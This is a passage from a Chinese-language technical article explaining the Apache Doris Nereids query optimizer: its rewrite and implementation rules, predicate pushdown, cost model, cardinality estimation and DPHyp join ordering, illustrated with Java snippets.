<li><code>(t1 JOIN t2) JOIN t3</code> -&gt; <code>t1 JOIN (t2 JOIN t3)</code></li>
<li>生成 Bushy Tree</li>
</ul>
</li>
<li>
<p><strong>聚合下推（Aggregate Pushdown）</strong>：</p>
<ul>
<li><code>PushDownAggThroughJoin</code></li>
<li>利用 Group By 列的唯一性</li>
</ul>
</li>
</ol>
<p><strong>示例：Join 交换</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinCommute</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneExplorationRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> innerLogicalJoin().when(join -&gt; {
            <span class="hljs-comment">// 只对 Inner Join 应用交换律</span>
            <span class="hljs-keyword">return</span> join.getJoinType() == JoinType.INNER_JOIN;
        }).then(join -&gt; {
            <span class="hljs-comment">// 交换左右子树</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalJoin</span>&lt;&gt;(
                join.getJoinType(),
                swapHashJoinConjuncts(join.getHashJoinConjuncts()),
                join.getOtherJoinConjuncts(),
                join.right(),  <span class="hljs-comment">// 交换</span>
                join.left()    <span class="hljs-comment">// 交换</span>
            );
        });
    }
}
</code></pre>
<h4 data-id="heading-17">3.1.3 Implementation 规则（实现规则）</h4>
<p><strong>作用</strong>：</p>
<ul>
<li>将逻辑计划转换为物理计划</li>
<li>生成可执行的算子</li>
<li>在 Optimizer 阶段执行</li>
</ul>
<p><strong>常见规则</strong>：</p>
<ol>
<li>
<p><strong>Join 实现</strong>：</p>
<ul>
<li><code>LogicalJoin -&gt; PhysicalHashJoin</code></li>
<li><code>LogicalJoin -&gt; PhysicalNestLoopJoin</code></li>
</ul>
</li>
<li>
<p><strong>聚合实现</strong>：</p>
<ul>
<li><code>LogicalAggregate -&gt; PhysicalHashAggregate</code></li>
<li><code>LogicalAggregate -&gt; PhysicalStreamAggregate</code></li>
</ul>
</li>
<li>
<p><strong>扫描实现</strong>：</p>
<ul>
<li><code>LogicalOlapScan -&gt; PhysicalOlapScan</code></li>
</ul>
</li>
</ol>
<p><strong>示例：HashJoin 实现</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogicalJoinToPhysicalHashJoin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneImplementationRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalJoin().then(join -&gt; {
            <span class="hljs-comment">// 选择左表为 Probe，右表为 Build</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhysicalHashJoin</span>&lt;&gt;(
                join.getJoinType(),
                join.getHashJoinConjuncts(),
                join.getOtherJoinConjuncts(),
                join.left(),   <span class="hljs-comment">// Probe 端</span>
                join.right(),  <span class="hljs-comment">// Build 端</span>
                JoinHint.NONE
            );
        });
    }
}
</code></pre>
<h3 data-id="heading-18">3.2 规则执行框架</h3>
<h4 data-id="heading-19">3.2.1 Rule 抽象基类</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/rules/Rule.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rule</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RuleType ruleType;               <span class="hljs-comment">// 规则类型</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Pattern&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Plan</span>&gt; pattern; <span class="hljs-comment">// 匹配模式</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RulePromise rulePromise;         <span class="hljs-comment">// 规则优先级</span>
    
    <span class="hljs-comment">/**
     * 应用规则
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;Plan&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(Plan node, CascadesContext context)</span>;
    
    <span class="hljs-comment">/**
     * 检查规则是否无效
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInvalid</span><span class="hljs-params">(BitSet disableRules, GroupExpression groupExpression)</span> {
        <span class="hljs-keyword">return</span> disableRules.get(<span class="hljs-built_in">this</span>.getRuleType().type())
                || !groupExpression.notApplied(<span class="hljs-built_in">this</span>)
                || !<span class="hljs-built_in">this</span>.getPattern().matchRoot(groupExpression.getPlan());
    }
}
</code></pre>
<p><strong>关键设计</strong>：</p>
<ol>
<li>
<p><strong>模式匹配（Pattern）</strong>：</p>
<ul>
<li>声明式定义规则适用的计划结构</li>
<li>支持通配符和类型匹配</li>
<li>高效的计划筛选</li>
</ul>
</li>
<li>
<p><strong>规则优先级（RulePromise）</strong>：</p>
<ul>
<li>ALWAYS：总是有益（如谓词下推）</li>
<li>HEURISTIC：启发式有益</li>
<li>COST_BASED：需要代价比较</li>
</ul>
</li>
<li>
<p><strong>应用追踪</strong>：</p>
<ul>
<li>记录已应用的规则</li>
<li>避免重复应用同一规则</li>
<li>防止无限递归</li>
</ul>
</li>
</ol>
<h4 data-id="heading-20">3.2.2 Rewriter 执行器</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/jobs/executor/Rewriter.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rewriter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractBatchJobExecutor</span> {
    
    <span class="hljs-comment">// Rewrite 作业列表（300+ 规则）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;RewriteJob&gt; DEFAULT_REWRITE_JOBS = jobs(
        
        <span class="hljs-comment">// 第一阶段：计划标准化</span>
        topic(<span class="hljs-string">"Plan Normalization"</span>,
            topDown(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateOrderByConstant</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalSubQueryAliasToLogicalProject</span>(),
                ExpressionNormalizationAndOptimization.FULL_RULE_INSTANCE,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExtractFilterFromCrossJoin</span>()
            )
        ),
        
        <span class="hljs-comment">// 第二阶段：子查询去关联</span>
        topic(<span class="hljs-string">"Subquery unnesting"</span>,
            bottomUp(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PullUpProjectUnderApply</span>()),
            topDown(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughProject</span>()),
            custom(RuleType.AGG_SCALAR_SUBQUERY_TO_WINDOW_FUNCTION,
                AggScalarSubQueryToWindowFunction::<span class="hljs-keyword">new</span>),
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelateApplyToUnCorrelateApply</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplyToJoin</span>()
            )
        ),
        
        <span class="hljs-comment">// 第三阶段：列裁剪和谓词下推</span>
        topic(<span class="hljs-string">"Column pruning and predicate pushdown"</span>,
            custom(RuleType.COLUMN_PRUNING, ColumnPruning::<span class="hljs-keyword">new</span>),
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughProject</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">PushDownFilterThroughJoin</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeFilters</span>()
            )
        ),
        
        <span class="hljs-comment">// 第四阶段：消除优化</span>
        topic(<span class="hljs-string">"Eliminate optimization"</span>,
            bottomUp(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateLimit</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateFilter</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateJoinCondition</span>(),
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">EliminateSemiJoin</span>()
            )
        )
        
        <span class="hljs-comment">// ... 更多阶段</span>
    );
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 执行所有 Rewrite 作业</span>
        <span class="hljs-keyword">for</span> (RewriteJob job : DEFAULT_REWRITE_JOBS) {
            job.execute(cascadesContext);
        }
    }
}
</code></pre>
<p><strong>Rewrite 阶段特点</strong>：</p>
<ol>
<li>
<p><strong>分阶段执行</strong>：</p>
<ul>
<li>每个 topic 是一个优化阶段</li>
<li>不同阶段有不同的优化目标</li>
<li>阶段顺序精心设计</li>
</ul>
</li>
<li>
<p><strong>遍历策略</strong>：</p>
<ul>
<li>topDown：自顶向下遍历</li>
<li>bottomUp：自底向上遍历</li>
<li>custom：自定义遍历</li>
</ul>
</li>
<li>
<p><strong>固定点迭代</strong>：</p>
<ul>
<li>重复执行直到计划不再变化</li>
<li>或达到最大迭代次数</li>
</ul>
</li>
</ol>
<h3 data-id="heading-21">3.3 规则示例：谓词下推</h3>
<p><strong>规则定义</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushDownFilterThroughJoin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OneRewriteRuleFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Rule <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> logicalFilter(
            logicalJoin()
        ).when(filter -&gt; {
            <span class="hljs-comment">// 只处理 Inner Join</span>
            LogicalJoin&lt;?, ?&gt; join = filter.child();
            <span class="hljs-keyword">return</span> join.getJoinType() == JoinType.INNER_JOIN;
        }).then(filter -&gt; {
            LogicalJoin&lt;Plan, Plan&gt; join = filter.child();
            
            <span class="hljs-comment">// 分离谓词</span>
            Set&lt;Expr&gt; leftOnly = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            Set&lt;Expr&gt; rightOnly = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            Set&lt;Expr&gt; both = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (Expr predicate : filter.getConjuncts()) {
                Set&lt;SlotReference&gt; slots = predicate.getInputSlots();
                <span class="hljs-type">boolean</span> <span class="hljs-variable">leftInput</span> <span class="hljs-operator">=</span> join.left().getOutputSet().containsAll(slots);
                <span class="hljs-type">boolean</span> <span class="hljs-variable">rightInput</span> <span class="hljs-operator">=</span> join.right().getOutputSet().containsAll(slots);
                
                <span class="hljs-keyword">if</span> (leftInput &amp;&amp; !rightInput) {
                    leftOnly.add(predicate);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rightInput &amp;&amp; !leftInput) {
                    rightOnly.add(predicate);
                } <span class="hljs-keyword">else</span> {
                    both.add(predicate);
                }
            }
            
            <span class="hljs-comment">// 构造新计划</span>
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newLeft</span> <span class="hljs-operator">=</span> leftOnly.isEmpty() 
                ? join.left() 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(leftOnly, join.left());
            
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newRight</span> <span class="hljs-operator">=</span> rightOnly.isEmpty() 
                ? join.right() 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(rightOnly, join.right());
            
            <span class="hljs-type">Plan</span> <span class="hljs-variable">newJoin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalJoin</span>&lt;&gt;(
                join.getJoinType(),
                join.getHashJoinConjuncts(),
                join.getOtherJoinConjuncts(),
                newLeft,
                newRight
            );
            
            <span class="hljs-keyword">return</span> both.isEmpty() 
                ? newJoin 
                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicalFilter</span>&lt;&gt;(both, newJoin);
        });
    }
}
</code></pre>
<p><strong>执行效果</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 原始计划</span>
<span class="hljs-keyword">Filter</span>(t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> t2.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>)
  <span class="hljs-keyword">Join</span>(t1.id <span class="hljs-operator">=</span> t2.id)
    Scan(t1)
    Scan(t2)

<span class="hljs-comment">-- 下推后</span>
<span class="hljs-keyword">Join</span>(t1.id <span class="hljs-operator">=</span> t2.id)
  <span class="hljs-keyword">Filter</span>(t1.value <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>)
    Scan(t1)
  <span class="hljs-keyword">Filter</span>(t2.status <span class="hljs-operator">=</span> <span class="hljs-string">'active'</span>)
    Scan(t2)
</code></pre>
<hr/>
<h2 data-id="heading-22">4. 代价模型与统计信息（How）</h2>
<h3 data-id="heading-23">4.1 代价模型设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/cost/Cost.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cost</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> cpuCost;      <span class="hljs-comment">// CPU 代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> memoryCost;   <span class="hljs-comment">// 内存代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> networkCost;  <span class="hljs-comment">// 网络代价</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> cost;         <span class="hljs-comment">// 综合代价</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cost</span><span class="hljs-params">(SessionVariable sessionVariable, <span class="hljs-type">double</span> cpuCost, 
                <span class="hljs-type">double</span> memoryCost, <span class="hljs-type">double</span> networkCost)</span> {
        <span class="hljs-built_in">this</span>.cpuCost = Math.max(<span class="hljs-number">0</span>, cpuCost);
        <span class="hljs-built_in">this</span>.memoryCost = Math.max(<span class="hljs-number">0</span>, memoryCost);
        <span class="hljs-built_in">this</span>.networkCost = Math.max(<span class="hljs-number">0</span>, networkCost);
        
        <span class="hljs-comment">// 加权计算综合代价</span>
        <span class="hljs-type">CostWeight</span> <span class="hljs-variable">costWeight</span> <span class="hljs-operator">=</span> CostWeight.get(sessionVariable);
        <span class="hljs-built_in">this</span>.cost = costWeight.cpuWeight * cpuCost 
                  + costWeight.memoryWeight * memoryCost
                  + costWeight.networkWeight * networkCost;
    }
}
</code></pre>
<p><strong>代价组成</strong>：</p>
<ol>
<li>
<p><strong>CPU 代价</strong>：</p>
<ul>
<li>数据处理量 × CPU 处理因子</li>
<li>考虑算子类型（Scan、Join、Agg）</li>
<li>基数估算的关键输入</li>
</ul>
</li>
<li>
<p><strong>内存代价</strong>：</p>
<ul>
<li>内存占用峰值</li>
<li>Hash Join 的 Build 端大小</li>
<li>聚合的中间状态大小</li>
</ul>
</li>
<li>
<p><strong>网络代价</strong>：</p>
<ul>
<li>Shuffle 数据量</li>
<li>Broadcast 数据量</li>
<li>跨节点数据传输</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">4.2 CostCalculator 代价计算</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/cost/CostCalculator.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CostCalculator</span> {
    <span class="hljs-comment">/**
     * 计算 GroupExpression 的代价
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Cost <span class="hljs-title function_">calculateCost</span><span class="hljs-params">(ConnectContext connectContext, 
                                    GroupExpression groupExpression,
                                    List&lt;PhysicalProperties&gt; childrenProperties)</span> {
        <span class="hljs-type">PlanContext</span> <span class="hljs-variable">planContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlanContext</span>(connectContext, groupExpression);
        
        <span class="hljs-comment">// 判断是否为 Broadcast Join</span>
        <span class="hljs-keyword">if</span> (childrenProperties.size() &gt;= <span class="hljs-number">2</span>
                &amp;&amp; childrenProperties.get(<span class="hljs-number">1</span>).getDistributionSpec() 
                    <span class="hljs-keyword">instanceof</span> DistributionSpecReplicated) {
            planContext.setBroadcastJoin();
        }
        
        <span class="hljs-comment">// 使用访问者模式计算代价</span>
        <span class="hljs-type">CostModel</span> <span class="hljs-variable">costModel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CostModel</span>(connectContext);
        <span class="hljs-keyword">return</span> groupExpression.getPlan().accept(costModel, planContext);
    }
}
</code></pre>
<h3 data-id="heading-25">4.3 各算子代价计算</h3>
<h4 data-id="heading-26">4.3.1 OlapScan 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalOlapScan</span><span class="hljs-params">(PhysicalOlapScan olapScan, PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> olapScan.getStats();
    
    <span class="hljs-comment">// CPU 代价 = 扫描行数 × 扫描因子</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> stats.getRowCount() * CPU_SCAN_COST_FACTOR;
    
    <span class="hljs-comment">// 网络代价 = 数据大小（压缩后）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> stats.computeSize() * NETWORK_COST_FACTOR;
    
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, <span class="hljs-number">0</span>, networkCost);
}
</code></pre>
<h4 data-id="heading-27">4.3.2 HashJoin 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalHashJoin</span><span class="hljs-params">(PhysicalHashJoin&lt;?, ?&gt; hashJoin, 
                                  PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">leftStats</span> <span class="hljs-operator">=</span> hashJoin.left().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">rightStats</span> <span class="hljs-operator">=</span> hashJoin.right().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">outputStats</span> <span class="hljs-operator">=</span> hashJoin.getStats();
    
    <span class="hljs-comment">// Build 端（右表）代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">buildCost</span> <span class="hljs-operator">=</span> rightStats.getRowCount() * CPU_BUILD_COST_FACTOR;
    
    <span class="hljs-comment">// Probe 端（左表）代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">probeCost</span> <span class="hljs-operator">=</span> leftStats.getRowCount() * CPU_PROBE_COST_FACTOR;
    
    <span class="hljs-comment">// 内存代价 = Build 端数据大小</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">memoryCost</span> <span class="hljs-operator">=</span> rightStats.computeSize();
    
    <span class="hljs-comment">// 网络代价</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (context.isBroadcastJoin()) {
        <span class="hljs-comment">// Broadcast Join: 右表复制到所有节点</span>
        networkCost = rightStats.computeSize() * backendNum;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Shuffle Join: 两表都需要 Shuffle</span>
        networkCost = leftStats.computeSize() + rightStats.computeSize();
    }
    
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> buildCost + probeCost;
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, memoryCost, networkCost);
}
</code></pre>
<h4 data-id="heading-28">4.3.3 HashAggregate 代价</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Cost <span class="hljs-title function_">visitPhysicalHashAggregate</span><span class="hljs-params">(PhysicalHashAggregate&lt;?, ?&gt; agg, 
                                       PlanContext context)</span> {
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">inputStats</span> <span class="hljs-operator">=</span> agg.child().getStats();
    <span class="hljs-type">Statistics</span> <span class="hljs-variable">outputStats</span> <span class="hljs-operator">=</span> agg.getStats();
    
    <span class="hljs-comment">// CPU 代价 = 输入行数 × 聚合因子</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">cpuCost</span> <span class="hljs-operator">=</span> inputStats.getRowCount() * CPU_AGG_COST_FACTOR;
    
    <span class="hljs-comment">// 内存代价 = Hash 表大小（Group By 列 + 聚合状态）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">memoryCost</span> <span class="hljs-operator">=</span> outputStats.getRowCount() 
                      * (groupByColumnsSize + aggregateStateSize);
    
    <span class="hljs-comment">// 网络代价（两阶段聚合需要 Shuffle）</span>
    <span class="hljs-type">double</span> <span class="hljs-variable">networkCost</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (agg.getAggPhase() == AggPhase.LOCAL) {
        <span class="hljs-comment">// 本地聚合输出需要 Shuffle</span>
        networkCost = outputStats.computeSize();
    }
    
    <span class="hljs-keyword">return</span> Cost.of(sessionVariable, cpuCost, memoryCost, networkCost);
}
</code></pre>
<h3 data-id="heading-29">4.4 统计信息（Statistics）</h3>
<p><strong>核心指标</strong>：</p>
<ol>
<li>
<p><strong>行数（RowCount）</strong>：</p>
<ul>
<li>表的总行数</li>
<li>过滤后的行数</li>
<li>Join 后的行数</li>
</ul>
</li>
<li>
<p><strong>列统计信息</strong>：</p>
<ul>
<li>NDV（Number of Distinct Values）：不同值的数量</li>
<li>Min/Max：最小最大值</li>
<li>Null Count：空值数量</li>
</ul>
</li>
<li>
<p><strong>数据大小（DataSize）</strong>：</p>
<ul>
<li>每行平均大小</li>
<li>总数据大小</li>
</ul>
</li>
</ol>
<h4 data-id="heading-30">4.4.1 基数估算（Cardinality Estimation）</h4>
<p><strong>过滤条件选择率</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterEstimation</span> {
    <span class="hljs-comment">/**
     * 计算等值过滤的选择率
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateEqualFilter</span><span class="hljs-params">(ColumnStatistic colStats, Literal value)</span> {
        <span class="hljs-comment">// 选择率 = 1 / NDV</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / colStats.getNdv();
    }
    
    <span class="hljs-comment">/**
     * 计算范围过滤的选择率
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateRangeFilter</span><span class="hljs-params">(ColumnStatistic colStats, 
                                             <span class="hljs-type">double</span> min, <span class="hljs-type">double</span> max)</span> {
        <span class="hljs-type">double</span> <span class="hljs-variable">colMin</span> <span class="hljs-operator">=</span> colStats.getMin();
        <span class="hljs-type">double</span> <span class="hljs-variable">colMax</span> <span class="hljs-operator">=</span> colStats.getMax();
        
        <span class="hljs-comment">// 选择率 = (filterMax - filterMin) / (colMax - colMin)</span>
        <span class="hljs-keyword">return</span> (Math.min(max, colMax) - Math.max(min, colMin)) 
             / (colMax - colMin);
    }
}
</code></pre>
<p><strong>Join 基数估算</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JoinEstimation</span> {
    <span class="hljs-comment">/**
     * 估算 Inner Join 的输出行数
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">estimateInnerJoin</span><span class="hljs-params">(Statistics leftStats, 
                                          Statistics rightStats,
                                          List&lt;Expr&gt; joinKeys)</span> {
        <span class="hljs-type">double</span> <span class="hljs-variable">leftRows</span> <span class="hljs-operator">=</span> leftStats.getRowCount();
        <span class="hljs-type">double</span> <span class="hljs-variable">rightRows</span> <span class="hljs-operator">=</span> rightStats.getRowCount();
        
        <span class="hljs-comment">// 计算 Join Key 的选择率</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">selectivity</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.0</span>;
        <span class="hljs-keyword">for</span> (Expr joinKey : joinKeys) {
            <span class="hljs-type">SlotReference</span> <span class="hljs-variable">leftSlot</span> <span class="hljs-operator">=</span> extractLeftSlot(joinKey);
            <span class="hljs-type">SlotReference</span> <span class="hljs-variable">rightSlot</span> <span class="hljs-operator">=</span> extractRightSlot(joinKey);
            
            <span class="hljs-type">double</span> <span class="hljs-variable">leftNdv</span> <span class="hljs-operator">=</span> leftStats.getColumnStatistic(leftSlot).getNdv();
            <span class="hljs-type">double</span> <span class="hljs-variable">rightNdv</span> <span class="hljs-operator">=</span> rightStats.getColumnStatistic(rightSlot).getNdv();
            
            <span class="hljs-comment">// 选择率 = 1 / max(leftNdv, rightNdv)</span>
            selectivity *= <span class="hljs-number">1.0</span> / Math.max(leftNdv, rightNdv);
        }
        
        <span class="hljs-comment">// 输出行数 = leftRows × rightRows × selectivity</span>
        <span class="hljs-keyword">return</span> leftRows * rightRows * selectivity;
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-31">5. Optimizer 优化执行（How）</h2>
<h3 data-id="heading-32">5.1 Optimizer 核心流程</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/jobs/executor/Optimizer.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Optimizer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CascadesContext cascadesContext;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 初始化 Memo</span>
        cascadesContext.toMemo();
        
        <span class="hljs-comment">// 2. 统计信息推导</span>
        cascadesContext.getMemo().getRoot().getLogicalExpressions().forEach(
            groupExpression -&gt; cascadesContext.pushJob(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeriveStatsJob</span>(groupExpression, cascadesContext.getCurrentJobContext())
            )
        );
        cascadesContext.getJobScheduler().executeJobPool(cascadesContext);
        
        <span class="hljs-comment">// 3. 判断是否使用 DPHyp 优化</span>
        <span class="hljs-keyword">if</span> (isDpHyp(cascadesContext)) {
            dpHypOptimize();
        }
        
        <span class="hljs-comment">// 4. Cascades 优化</span>
        cascadesContext.pushJob(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptimizeGroupJob</span>(
                cascadesContext.getMemo().getRoot(), 
                cascadesContext.getCurrentJobContext()
            )
        );
        cascadesContext.getJobScheduler().executeJobPool(cascadesContext);
    }
    
    <span class="hljs-comment">/**
     * 判断是否使用 DPHyp 算法
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDpHyp</span><span class="hljs-params">(CascadesContext cascadesContext)</span> {
        <span class="hljs-type">SessionVariable</span> <span class="hljs-variable">sessionVariable</span> <span class="hljs-operator">=</span> cascadesContext.getConnectContext()
            .getSessionVariable();
        
        <span class="hljs-type">int</span> <span class="hljs-variable">maxTableCount</span> <span class="hljs-operator">=</span> sessionVariable.getMaxTableCountUseCascadesJoinReorder();
        <span class="hljs-type">int</span> <span class="hljs-variable">continuousJoinNum</span> <span class="hljs-operator">=</span> Memo.countMaxContinuousJoin(
            cascadesContext.getRewritePlan()
        );
        
        <span class="hljs-comment">// Join 数量超过阈值时使用 DPHyp</span>
        <span class="hljs-keyword">return</span> sessionVariable.enableDPHypOptimizer 
            || continuousJoinNum &gt; maxTableCount;
    }
}
</code></pre>
<h3 data-id="heading-33">5.2 DPHyp Join 顺序优化</h3>
<p><strong>DPHyp（Dynamic Programming with Hypergraph）</strong>：</p>
<p><strong>核心思想</strong>：</p>
<ul>
<li>使用动态规划找出最优 Join 顺序</li>
<li>支持超过 10 个表的 Join</li>
<li>生成 Bushy Tree（而非左深树）</li>
</ul>
<p><strong>算法流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[提取所有Join节点] --&gt; B[构建超图]
    B --&gt; C[枚举连接对]
    C --&gt; D[计算每个子集的最优计划]
    D --&gt; E[动态规划合并]
    E --&gt; F[选择全局最优]
    
    D -.子问题.-&gt; D
</code></pre>
<p><strong>实现要点</strong>：</p>
